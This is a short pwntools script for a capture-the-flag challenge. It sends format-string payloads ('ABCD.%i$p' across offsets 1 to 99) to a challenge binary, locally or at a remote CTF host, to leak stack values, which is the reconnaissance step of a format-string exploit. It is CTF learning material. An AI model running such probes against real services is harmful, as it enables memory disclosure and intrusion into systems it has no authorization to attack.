from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./your-name_patched")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

print(elf.got)

io.recvuntil(b"Introduce su alias:")
io.recvline()

io.sendline(b"mago")

for i in range(1, 100):
    io.sendlineafter(b": ", b"2")
    io.sendlineafter(b": ", f"ABCD.%{i}$p".encode())
    io.recvuntil("Tu nombre: ")

    print(f"[+] {i} : {io.recvline().decode()}")

io.interactive()
